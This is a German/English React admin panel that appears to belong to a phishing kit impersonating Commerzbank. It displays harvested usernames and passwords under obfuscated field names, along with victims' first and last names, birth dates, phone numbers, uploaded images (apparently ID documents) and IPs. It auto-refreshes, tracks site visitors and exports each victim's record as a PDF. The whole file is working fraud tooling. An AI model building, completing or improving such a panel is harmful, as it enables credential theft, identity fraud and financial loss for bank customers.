import React, { useState, useEffect } from 'react';
import axios from 'axios';
import jsPDF from 'jspdf';

interface UserData {
  id: string;
  sessionId: string;
  ip: string;
  userAgent: string;
  createdAt: string;
  updatedAt: string;
  loginData?: {
    id: string;
    sessionId: string;
    xusr: string;
    xpss: string;
    timestamp: string;
    ip: string;
    userAgent: string;
  };
  infoData?: {
    id: string;
    sessionId: string;
    xname1: string;
    xname2: string;
    xdob: string;
    xtel: string;
    timestamp: string;
    ip: string;
    userAgent: string;
  };
  uploadData?: {
    id: string;
    sessionId: string;
    filename: string;
    originalName: string;
    fileSize: number;
    filePath: string;
    mimeType: string;
    timestamp: string;
    ip: string;
    userAgent: string;
  };
  finalData?: {
    id: string;
    sessionId: string;
    xusr: string;
    xpss: string;
    xname1: string;
    xname2: string;
    xdob: string;
    xtel: string;
    timestamp: string;
    ip: string;
    userAgent: string;
  };
}

interface Visitor {
  ip: string;
  userAgent: string;
  timestamp: string;
  path: string;
  method: string;
}

interface Stats {
  totalSessions: number;
  completedSessions: number;
  totalVisitors: number;
  uniqueIPs: number;
}

const AdminPanel: React.FC = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [activeTab, setActiveTab] = useState<'users' | 'visitors'>('users');
  const [userData, setUserData] = useState<UserData[]>([]);
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [stats, setStats] = useState<Stats | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [selectedImage, setSelectedImage] = useState<string | null>(null);
  const [deletingId, setDeletingId] = useState<number | null>(null);
  const [showDeleteDialog, setShowDeleteDialog] = useState(false);
  const [deleteIndex, setDeleteIndex] = useState<number | null>(null);
  const [showSuccessAlert, setShowSuccessAlert] = useState(false);
  const [showViewDialog, setShowViewDialog] = useState(false);
  const [selectedUser, setSelectedUser] = useState<any>(null);
  const [successMessage, setSuccessMessage] = useState('');
  const [lastRefresh, setLastRefresh] = useState<Date | null>(null);
  const [autoRefresh, setAutoRefresh] = useState(false);
  const [language, setLanguage] = useState<'de' | 'en'>('de');

  const API_BASE_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001/api';

  // Language texts
  const texts = {
    de: {
      adminPanel: 'Admin Panel',
      lastUpdated: 'Zuletzt aktualisiert',
      autoRefresh: 'Auto-Aktualisierung (10s)',
      refreshData: 'Daten aktualisieren',
      refreshing: 'Aktualisiere...',
      logout: 'Abmelden',
      totalSessions: 'Gesamte Sitzungen',
      completedSessions: 'Abgeschlossene Sitzungen',
      siteVisitors: 'Website-Besucher',
      uniqueIPs: 'Eindeutige IPs',
      userSessionsCreated: 'Benutzersitzungen erstellt',
      sessionsWithFullData: 'Sitzungen mit vollständigen Daten',
      totalPageVisits: 'Gesamte Seitenaufrufe',
      uniqueVisitors: 'Eindeutige Besucher',
      userData: 'Benutzerdaten',
      siteVisitorsTab: 'Website-Besucher',
      allUserData: 'Alle Benutzerdaten',
      users: 'Benutzer',
      username: 'Benutzername',
      password: 'Passwort',
      firstName: 'Vorname',
      lastName: 'Nachname',
      birthDate: 'Geburtsdatum',
      phone: 'Telefon',
      file: 'Datei',
      ipAddress: 'IP-Adresse',
      browser: 'Browser',
      date: 'Datum',
      actions: 'Aktionen',
      noUserData: 'Keine Benutzerdaten verfügbar.',
      visits: 'Besuche',
      confirmDelete: 'Löschen bestätigen',
      deleteConfirmation: 'Sind Sie sicher, dass Sie diesen Dateneintrag löschen möchten?',
      cannotBeUndone: 'Diese Aktion kann nicht rückgängig gemacht werden.',
      cancel: 'Abbrechen',
      delete: 'Löschen',
      dataRefreshed: 'Daten erfolgreich aktualisiert!',
      sessionDeleted: 'Benutzersitzung erfolgreich gelöscht!',
      loginFailed: 'Anmeldung fehlgeschlagen',
      invalidPassword: 'Ungültiges Passwort',
      failedToLoadData: 'Fehler beim Laden der Daten',
      failedToDeleteSession: 'Fehler beim Löschen der Benutzersitzung'
    },
    en: {
      adminPanel: 'Admin Panel',
      lastUpdated: 'Last updated',
      autoRefresh: 'Auto-refresh (10s)',
      refreshData: 'Refresh Data',
      refreshing: 'Refreshing...',
      logout: 'Logout',
      totalSessions: 'Total Sessions',
      completedSessions: 'Completed Sessions',
      siteVisitors: 'Site Visitors',
      uniqueIPs: 'Unique IPs',
      userSessionsCreated: 'User sessions created',
      sessionsWithFullData: 'Sessions with full data',
      totalPageVisits: 'Total page visits',
      uniqueVisitors: 'Unique visitors',
      userData: 'User Data',
      siteVisitorsTab: 'Site Visitors',
      allUserData: 'All User Data',
      users: 'users',
      username: 'Username',
      password: 'Password',
      firstName: 'First Name',
      lastName: 'Last Name',
      birthDate: 'Birth Date',
      phone: 'Phone',
      file: 'File',
      ipAddress: 'IP Address',
      browser: 'Browser',
      date: 'Date',
      actions: 'Actions',
      noUserData: 'No user data available.',
      visits: 'visits',
      confirmDelete: 'Confirm Delete',
      deleteConfirmation: 'Are you sure you want to delete this data entry?',
      cannotBeUndone: 'This action cannot be undone.',
      cancel: 'Cancel',
      delete: 'Delete',
      dataRefreshed: 'Data refreshed successfully!',
      sessionDeleted: 'User session deleted successfully!',
      loginFailed: 'Login failed',
      invalidPassword: 'Invalid password',
      failedToLoadData: 'Failed to load data',
      failedToDeleteSession: 'Failed to delete user session'
    }
  };

  const t = texts[language];

  // Auto-refresh functionality
  useEffect(() => {
    let interval: NodeJS.Timeout;
    
    if (autoRefresh && isAuthenticated) {
      interval = setInterval(() => {
        loadData(false); // Silent refresh
      }, 10000); // Refresh every 10 seconds for more dynamic updates
    }
    
    return () => {
      if (interval) {
        clearInterval(interval);
      }
    };
  }, [autoRefresh, isAuthenticated]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await axios.post(`${API_BASE_URL}/admin/login`, { password });
      if (response.data.success) {
        setIsAuthenticated(true);
        // Load data only once after successful login
        await loadData();
      } else {
        setError('Invalid password');
      }
    } catch (err) {
      setError('Login failed');
    } finally {
      setLoading(false);
    }
  };

  const loadData = async (showSuccess = true) => {
    try {
      setLoading(true);
      setError('');
      if (showSuccess) {
        setShowSuccessAlert(false);
      }
      
      const [userResponse, visitorsResponse, statsResponse] = await Promise.all([
        axios.get(`${API_BASE_URL}/admin/user-data`),
        axios.get(`${API_BASE_URL}/admin/visitors`),
        axios.get(`${API_BASE_URL}/admin/stats`)
      ]);

      setUserData(userResponse.data.data);
      setVisitors(visitorsResponse.data.data);
      setStats(statsResponse.data.stats);
      setLastRefresh(new Date());
      
      console.log('Data refreshed successfully');
      
      if (showSuccess) {
        // Show refresh success message
        setSuccessMessage(t.dataRefreshed);
        setShowSuccessAlert(true);
        
        // Auto-hide after 2 seconds
        setTimeout(() => {
          setShowSuccessAlert(false);
        }, 2000);
      }
    } catch (err) {
      setError('Failed to load data');
      console.error('Refresh error:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleDeleteClick = (index: number) => {
    setDeleteIndex(index);
    setShowDeleteDialog(true);
  };

  const handleViewClick = (userData: any) => {
    setSelectedUser(userData);
    setShowViewDialog(true);
  };

  const handleDownloadPDF = async () => {
    if (!selectedUser) return;

    const doc = new jsPDF();
    const pageWidth = doc.internal.pageSize.getWidth();
    const margin = 20;
    let yPosition = 20;

    // Helper function to add text with word wrap
    const addText = (text: string, x: number, y: number, maxWidth: number, fontSize: number = 10) => {
      doc.setFontSize(fontSize);
      const lines = doc.splitTextToSize(text, maxWidth);
      doc.text(lines, x, y);
      return y + (lines.length * fontSize * 0.4) + 5;
    };

    // Title
    yPosition = addText('Benutzerdetails - Commerzbank', margin, yPosition, pageWidth - 2 * margin, 16);
    yPosition += 10;

    // Login Information
    yPosition = addText('🔐 Anmeldeinformationen', margin, yPosition, pageWidth - 2 * margin, 12);
    yPosition = addText(`Benutzername: ${selectedUser.xusr || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
    yPosition = addText(`Passwort: ${selectedUser.xpss ? '***' : 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
    yPosition += 10;

    // Personal Information
    yPosition = addText('👤 Persönliche Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
    yPosition = addText(`Vorname: ${selectedUser.xname1 || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
    yPosition = addText(`Nachname: ${selectedUser.xname2 || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
    yPosition = addText(`Geburtsdatum: ${selectedUser.xdob || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
    yPosition = addText(`Telefonnummer: ${selectedUser.xtel || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
    yPosition += 10;

    // File Upload Information with Image
    if (selectedUser.filename) {
      yPosition = addText('📁 Hochgeladene Datei', margin, yPosition, pageWidth - 2 * margin, 12);
      yPosition = addText(`Ursprünglicher Dateiname: ${selectedUser.originalName}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
      yPosition = addText(`Dateigröße: ${Math.round(selectedUser.size / 1024)} KB`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
      yPosition += 5;

      // Add image to PDF
      try {
        const imageUrl = `${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filename}`;
        
        // Fetch the image as blob
        const response = await fetch(imageUrl);
        if (response.ok) {
          const blob = await response.blob();
          const reader = new FileReader();
          
          reader.onload = function() {
            const base64 = reader.result as string;
            
            // Calculate image dimensions to fit in PDF
            const maxWidth = pageWidth - 2 * margin - 20;
            const maxHeight = 100;
            
            // Add image to PDF
            doc.addImage(base64, 'JPEG', margin + 10, yPosition, maxWidth, maxHeight);
            yPosition += maxHeight + 10;
            
            // Technical Information
            yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
            yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
            yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
            yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
            yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);

            // Footer
            const footerY = doc.internal.pageSize.getHeight() - 20;
            doc.setFontSize(8);
            doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);

            // Download the PDF
            const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
            doc.save(fileName);
          };
          
          reader.readAsDataURL(blob);
        } else {
          // If image fails to load, continue without image
          yPosition = addText('Bild konnte nicht geladen werden', margin + 10, yPosition, pageWidth - 2 * margin - 10);
          yPosition += 10;
          
          // Technical Information
          yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
          yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
          yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
          yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
          yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);

          // Footer
          const footerY = doc.internal.pageSize.getHeight() - 20;
          doc.setFontSize(8);
          doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);

          // Download the PDF
          const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
          doc.save(fileName);
        }
      } catch (error) {
        console.error('Error loading image for PDF:', error);
        // Continue without image
        yPosition = addText('Bild konnte nicht geladen werden', margin + 10, yPosition, pageWidth - 2 * margin - 10);
        yPosition += 10;
        
        // Technical Information
        yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
        yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
        yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
        yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
        yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);

        // Footer
        const footerY = doc.internal.pageSize.getHeight() - 20;
        doc.setFontSize(8);
        doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);

        // Download the PDF
        const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
        doc.save(fileName);
      }
    } else {
      // No file uploaded
      yPosition = addText('📁 Hochgeladene Datei', margin, yPosition, pageWidth - 2 * margin, 12);
      yPosition = addText('Keine Datei hochgeladen', margin + 10, yPosition, pageWidth - 2 * margin - 10);
      yPosition += 10;

      // Technical Information
      yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
      yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
      yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
      yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
      yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);

      // Footer
      const footerY = doc.internal.pageSize.getHeight() - 20;
      doc.setFontSize(8);
      doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);

      // Download the PDF
      const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
      doc.save(fileName);
    }
  };

  const handleDeleteConfirm = async () => {
    if (deleteIndex === null) return;

    setDeletingId(deleteIndex);
    setShowDeleteDialog(false);
    
    try {
      // Get the session to delete
      const sessionToDelete = userData[deleteIndex];
      
      if (!sessionToDelete || !sessionToDelete.sessionId) {
        throw new Error('Invalid session to delete');
      }
      
      console.log('Deleting session:', sessionToDelete.sessionId);
      
      // Delete the session using the sessionId
      const response = await axios.delete(`${API_BASE_URL}/admin/delete-data/${sessionToDelete.sessionId}`);
      console.log('Delete response:', response.data);
      
      // Reload data to get updated stats
      await loadData();
      console.log('User session deleted successfully');
      
      // Show success alert
      setSuccessMessage(t.sessionDeleted);
      setShowSuccessAlert(true);
      
      // Auto-hide after 3 seconds
      setTimeout(() => {
        setShowSuccessAlert(false);
      }, 3000);
      
    } catch (err) {
      console.error('Delete error:', err);
      setError('Failed to delete user session');
    } finally {
      setDeletingId(null);
      setDeleteIndex(null);
    }
  };

  const handleDeleteCancel = () => {
    setShowDeleteDialog(false);
    setDeleteIndex(null);
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString();
  };

  const getBrowserInfo = (userAgent: string) => {
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    return 'Other';
  };

  const renderUserData = () => {
    // Safety check for userData
    if (!userData || !Array.isArray(userData)) {
      return (
        <div className="admin-content">
          <h3>{t.allUserData} (0 {t.users})</h3>
          <p>{t.noUserData}</p>
        </div>
      );
    }
    
    // Process each user session
    const processedUsers = userData.map((session, index) => {
      // Safety check for session
      if (!session) {
        return {
          xusr: '',
          xpss: '',
          xname1: '',
          xname2: '',
          xdob: '',
          xtel: '',
          filename: '',
          originalName: '',
          size: 0,
          ip: '',
          userAgent: '',
          timestamp: '',
          sessionId: ''
        };
      }
      
      // Combine data from all steps
      const combinedData = {
        xusr: session.loginData?.xusr || session.finalData?.xusr || '',
        xpss: session.loginData?.xpss || session.finalData?.xpss || '',
        xname1: session.infoData?.xname1 || session.finalData?.xname1 || '',
        xname2: session.infoData?.xname2 || session.finalData?.xname2 || '',
        xdob: session.infoData?.xdob || session.finalData?.xdob || '',
        xtel: session.infoData?.xtel || session.finalData?.xtel || '',
        filename: session.uploadData?.filename || '',
        originalName: session.uploadData?.originalName || '',
        size: session.uploadData?.fileSize || 0,
        ip: session.ip || '',
        userAgent: session.userAgent || '',
        timestamp: session.createdAt || '',
        sessionId: session.sessionId || ''
      };
      
      // Debug logging
      console.log('Processing session:', session.sessionId);
      console.log('Has upload data:', !!session.uploadData);
      if (session.uploadData) {
        console.log('Upload data:', session.uploadData);
        console.log('Filename:', session.uploadData.filename);
        console.log('Image URL will be:', `${API_BASE_URL.replace('/api', '')}/uploads/${session.uploadData.filename}`);
      }
      console.log('Combined data:', combinedData);
      console.log('---');
      
      return combinedData;
    });
    
    return (
      <div className="admin-content">
        <h3>{t.allUserData} ({processedUsers.length} {t.users})</h3>
        <div className="data-table">
          <table>
            <thead>
              <tr>
                <th>{t.username}</th>
                <th>{t.password}</th>
                <th>{t.firstName}</th>
                <th>{t.lastName}</th>
                <th>{t.birthDate}</th>
                <th>{t.phone}</th>
                <th>{t.file}</th>
                <th>{t.ipAddress}</th>
                <th>{t.browser}</th>
                <th>{t.date}</th>
                <th>{t.actions}</th>
              </tr>
            </thead>
            <tbody>
              {processedUsers.map((user, index) => (
                <tr key={index} data-session={user.sessionId}>
                  <td title={`Username: ${user.xusr}`}>{user.xusr || '-'}</td>
                  <td title={`Password: ${user.xpss ? 'Set' : 'Not set'}`}>{user.xpss ? '***' : '-'}</td>
                  <td title={`First Name: ${user.xname1}`}>{user.xname1 || '-'}</td>
                  <td title={`Last Name: ${user.xname2}`}>{user.xname2 || '-'}</td>
                  <td title={`Birth Date: ${user.xdob}`}>{user.xdob || '-'}</td>
                  <td title={`Phone: ${user.xtel}`}>{user.xtel || '-'}</td>
                  <td>
                    {user.filename ? (
                      <div className="file-display">
                        <img 
                          src={`${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`}
                          alt={user.originalName}
                          className="uploaded-image"
                          style={{width: '50px', height: '50px', objectFit: 'cover', cursor: 'pointer'}}
                          onClick={() => setSelectedImage(`${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`)}
                          onLoad={() => {
                            console.log('✅ Image loaded successfully:', user.filename);
                          }}
                          onError={(e) => {
                            console.error('❌ Image failed to load:', user.filename, 'URL:', `${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`);
                            e.currentTarget.style.display = 'none';
                            const nextElement = e.currentTarget.nextElementSibling as HTMLElement;
                            if (nextElement) {
                              nextElement.style.display = 'block';
                            }
                          }}
                        />
                        <div className="file-info" style={{display: 'none'}}>
                          {user.originalName}
                          <br />
                          <small>({Math.round(user.size / 1024)}KB)</small>
                        </div>
                      </div>
                    ) : '-'}
                  </td>
                  <td className="ip-address">{user.ip}</td>
                  <td>{getBrowserInfo(user.userAgent)}</td>
                  <td>{formatDate(user.timestamp)}</td>
                  <td>
                    <div style={{display: 'flex', gap: '8px', alignItems: 'center'}}>
                      <button
                        className="view-btn"
                        onClick={() => handleViewClick(user)}
                        title="Benutzerdetails anzeigen"
                        style={{
                          background: '#2c5f5f',
                          color: 'white',
                          border: 'none',
                          borderRadius: '4px',
                          padding: '6px 8px',
                          cursor: 'pointer',
                          fontSize: '14px'
                        }}
                      >
                        👁️
                      </button>
                      <button
                        className="delete-btn"
                        onClick={() => handleDeleteClick(index)}
                        disabled={deletingId === index}
                        title="Delete this user session"
                      >
                        {deletingId === index ? (
                          <span className="loading-spinner-small">⏳</span>
                        ) : (
                          <span className="delete-icon">🗑️</span>
                        )}
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    );
  };

  const renderVisitors = () => {
    return (
      <div className="admin-content">
        <h3>{t.siteVisitorsTab} ({visitors.length} {t.visits})</h3>
        <div className="data-table">
          <table>
            <thead>
              <tr>
                <th>{t.ipAddress}</th>
                <th>{t.browser}</th>
                <th>{t.date}</th>
              </tr>
            </thead>
            <tbody>
              {visitors.slice(-50).reverse().map((visitor, index) => (
                <tr key={index}>
                  <td className="ip-address">{visitor.ip}</td>
                  <td>{getBrowserInfo(visitor.userAgent)}</td>
                  <td>{formatDate(visitor.timestamp)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    );
  };

  if (!isAuthenticated) {
    return (
      <div className="admin-login">
        <div className="login-form">
          <h2>Admin Panel</h2>
          <form onSubmit={handleLogin}>
            <div className="form-group">
              <label>Password:</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter admin password"
                required
              />
            </div>
            {error && <div className="error">{error}</div>}
            <button type="submit" disabled={loading}>
              {loading ? 'Logging in...' : 'Login'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="admin-panel">
      {/* Success Alert */}
      {showSuccessAlert && (
        <div className="success-alert">
          <div className="alert-content">
            <span className="alert-icon">✅</span>
            <span className="alert-message">{successMessage}</span>
            <button 
              className="alert-close" 
              onClick={() => setShowSuccessAlert(false)}
            >
              ×
            </button>
          </div>
        </div>
      )}

      <div className="admin-header">
        <div className="header-left">
          <h1>{t.adminPanel}</h1>
          {lastRefresh && (
            <p className="last-refresh">
              {t.lastUpdated}: {lastRefresh.toLocaleTimeString()}
            </p>
          )}
        </div>
        <div className="header-buttons">
          <div className="language-selector">
            <select 
              value={language} 
              onChange={(e) => setLanguage(e.target.value as 'de' | 'en')}
              className="language-select"
            >
              <option value="de">🇩🇪 Deutsch</option>
              <option value="en">🇺🇸 English</option>
            </select>
          </div>
          <label className="auto-refresh-toggle">
            <input
              type="checkbox"
              checked={autoRefresh}
              onChange={(e) => setAutoRefresh(e.target.checked)}
            />
            {t.autoRefresh}
          </label>
          <button 
            onClick={() => loadData()} 
            className="refresh-btn"
            disabled={loading}
          >
            {loading ? (
              <>
                <span className="loading-spinner-small">⏳</span>
                {t.refreshing}
              </>
            ) : (
              t.refreshData
            )}
          </button>
          <button onClick={() => setIsAuthenticated(false)} className="logout-btn">
            {t.logout}
          </button>
        </div>
      </div>

      {stats && (
        <div className="stats-grid">
          <div className="stat-card">
            <h3>{t.totalSessions}</h3>
            <p className="stat-number">{stats.totalSessions}</p>
            <p className="stat-description">{t.userSessionsCreated}</p>
          </div>
          <div className="stat-card">
            <h3>{t.completedSessions}</h3>
            <p className="stat-number">{stats.completedSessions}</p>
            <p className="stat-description">{t.sessionsWithFullData}</p>
          </div>
          <div className="stat-card">
            <h3>{t.siteVisitors}</h3>
            <p className="stat-number">{stats.totalVisitors}</p>
            <p className="stat-description">{t.totalPageVisits}</p>
          </div>
          <div className="stat-card">
            <h3>{t.uniqueIPs}</h3>
            <p className="stat-number">{stats.uniqueIPs}</p>
            <p className="stat-description">{t.uniqueVisitors}</p>
          </div>
        </div>
      )}

      <div className="admin-tabs">
        <button
          className={activeTab === 'users' ? 'active' : ''}
          onClick={() => setActiveTab('users')}
        >
          {t.userData}
        </button>
        <button
          className={activeTab === 'visitors' ? 'active' : ''}
          onClick={() => setActiveTab('visitors')}
        >
          {t.siteVisitorsTab}
        </button>
      </div>

      {activeTab === 'users' ? renderUserData() : renderVisitors()}

      {/* Image Modal */}
      {selectedImage && (
        <div className="image-modal" onClick={() => setSelectedImage(null)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <button className="close-btn" onClick={() => setSelectedImage(null)}>
              ×
            </button>
            <img src={selectedImage} alt="Full size" className="full-image" />
          </div>
        </div>
      )}

      {/* Delete Confirmation Dialog */}
      {showDeleteDialog && (
        <div className="delete-modal" onClick={handleDeleteCancel}>
          <div className="delete-dialog" onClick={(e) => e.stopPropagation()}>
            <div className="dialog-header">
              <h3>{t.confirmDelete}</h3>
            </div>
            <div className="dialog-body">
              <p>{t.deleteConfirmation}</p>
              <p className="warning-text">{t.cannotBeUndone}</p>
            </div>
            <div className="dialog-footer">
              <button className="cancel-btn" onClick={handleDeleteCancel}>
                {t.cancel}
              </button>
              <button className="confirm-delete-btn" onClick={handleDeleteConfirm}>
                {t.delete}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* User Details View Dialog */}
      {showViewDialog && selectedUser && (
        <div 
          className="delete-modal" 
          onClick={() => setShowViewDialog(false)}
          style={{zIndex: 1001}}
        >
          <div 
            className="delete-dialog" 
            onClick={(e) => e.stopPropagation()}
            style={{maxWidth: '600px', width: '90%'}}
          >
            <div className="dialog-header">
              <h3>👤 Benutzerdetails</h3>
              <button 
                onClick={() => setShowViewDialog(false)}
                style={{
                  background: 'none',
                  border: 'none',
                  fontSize: '20px',
                  cursor: 'pointer',
                  color: '#666'
                }}
              >
                ×
              </button>
            </div>
            <div className="dialog-body" style={{maxHeight: '70vh', overflowY: 'auto'}}>
              <div style={{display: 'grid', gap: '20px'}}>
                {/* Login Information */}
                <div style={{border: '1px solid #ddd', borderRadius: '8px', padding: '15px'}}>
                  <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>🔐 Anmeldeinformationen</h4>
                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
                    <div>
                      <strong>Benutzername:</strong><br/>
                      <span style={{color: '#333'}}>{selectedUser.xusr || 'Nicht angegeben'}</span>
                    </div>
                    <div>
                      <strong>Passwort:</strong><br/>
                      <span style={{color: '#333'}}>{selectedUser.xpss ? '***' : 'Nicht angegeben'}</span>
                    </div>
                  </div>
                </div>

                {/* Personal Information */}
                <div style={{border: '1px solid #ddd', borderRadius: '8px', padding: '15px'}}>
                  <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>👤 Persönliche Informationen</h4>
                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
                    <div>
                      <strong>Vorname:</strong><br/>
                      <span style={{color: '#333'}}>{selectedUser.xname1 || 'Nicht angegeben'}</span>
                    </div>
                    <div>
                      <strong>Nachname:</strong><br/>
                      <span style={{color: '#333'}}>{selectedUser.xname2 || 'Nicht angegeben'}</span>
                    </div>
                    <div>
                      <strong>Geburtsdatum:</strong><br/>
                      <span style={{color: '#333'}}>{selectedUser.xdob || 'Nicht angegeben'}</span>
                    </div>
                    <div>
                      <strong>Telefonnummer:</strong><br/>
                      <span style={{color: '#333'}}>{selectedUser.xtel || 'Nicht angegeben'}</span>
                    </div>
                  </div>
                </div>

                {/* File Upload Information */}
                {selectedUser.filename && (
                  <div style={{border: '1px solid #ddd', borderRadius: '8px', padding: '15px'}}>
                    <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>📁 Hochgeladene Datei</h4>
                    <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
                      <div>
                        <strong>Ursprünglicher Dateiname:</strong><br/>
                        <span style={{color: '#333'}}>{selectedUser.originalName}</span>
                      </div>
                      <div>
                        <strong>Dateigröße:</strong><br/>
                        <span style={{color: '#333'}}>{Math.round(selectedUser.size / 1024)} KB</span>
                      </div>
                    </div>
                    <div style={{marginTop: '10px'}}>
                      <strong>Dateivorschau:</strong><br/>
                      <img 
                        src={`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filename}`}
                        alt={selectedUser.originalName}
                        style={{
                          width: '100px',
                          height: '100px',
                          objectFit: 'cover',
                          border: '1px solid #ddd',
                          borderRadius: '4px',
                          marginTop: '5px'
                        }}
                        onError={(e) => {
                          e.currentTarget.style.display = 'none';
                        }}
                      />
                    </div>
                  </div>
                )}

                {/* Technical Information */}
                <div style={{border: '1px solid #ddd', borderRadius: '8px', padding: '15px'}}>
                  <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>🌐 Technische Informationen</h4>
                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
                    <div>
                      <strong>IP-Adresse:</strong><br/>
                      <span style={{color: '#333'}}>{selectedUser.ip}</span>
                    </div>
                    <div>
                      <strong>Browser:</strong><br/>
                      <span style={{color: '#333'}}>{getBrowserInfo(selectedUser.userAgent)}</span>
                    </div>
                    <div>
                      <strong>Sitzungs-ID:</strong><br/>
                      <span style={{color: '#333', fontSize: '12px', wordBreak: 'break-all'}}>{selectedUser.sessionId}</span>
                    </div>
                    <div>
                      <strong>Datum:</strong><br/>
                      <span style={{color: '#333'}}>{formatDate(selectedUser.timestamp)}</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div className="dialog-footer" style={{display: 'flex', gap: '10px', justifyContent: 'space-between'}}>
              <button 
                className="download-btn" 
                onClick={handleDownloadPDF}
                style={{
                  background: '#28a745',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  padding: '10px 20px',
                  cursor: 'pointer',
                  fontSize: '14px',
                  flex: '1'
                }}
              >
                📄 PDF Herunterladen
              </button>
              <button 
                className="cancel-btn" 
                onClick={() => setShowViewDialog(false)}
                style={{
                  background: '#6c757d',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  padding: '10px 20px',
                  cursor: 'pointer',
                  fontSize: '14px',
                  flex: '1'
                }}
              >
                Schließen
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminPanel;
